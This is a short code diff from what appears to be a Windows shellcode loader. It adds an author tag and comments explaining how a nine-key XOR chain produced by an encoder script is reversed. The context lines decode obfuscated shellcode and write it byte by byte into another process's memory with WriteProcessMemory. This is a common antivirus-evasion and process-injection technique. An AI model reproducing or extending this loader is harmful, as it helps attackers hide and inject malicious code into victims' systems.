@@ -2,7 +2,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include "connector.h"
-
+//coded by orca666
 
 int main(int argc, char* argv[]) {
     HWND hWnd = GetConsoleWindow();
@@ -55,6 +55,8 @@ int main(int argc, char* argv[]) {
 
 
             for (int i = 0; i <= sizeof(shellcode); i++) {
+                // since in encoder.py it was : ^ 0x11) ^ 0x52 ) ^ 0xc7) ^ 0xa3) ^ 0xd8) ^ 0x05) ^ 0x32) ^ 0xf7) ^ 0x7a)
+                // thus it is  ^ 0x7a ^ 0xf7 ^ 0x32 ^ 0x05 ^ 0xd8 ^ 0xa3 ^ 0xc7 ^ 0x52 ^ 0x11
                 char DecodedOpCode = shellcode[i] ^ 0x7a ^ 0xf7 ^ 0x32 ^ 0x05 ^ 0xd8 ^ 0xa3 ^ 0xc7 ^ 0x52 ^ 0x11;
                 if (WriteProcessMemory(process, LPVOID((ULONG_PTR)base_address + n), &DecodedOpCode, 1, NULL)) {
                     n++;
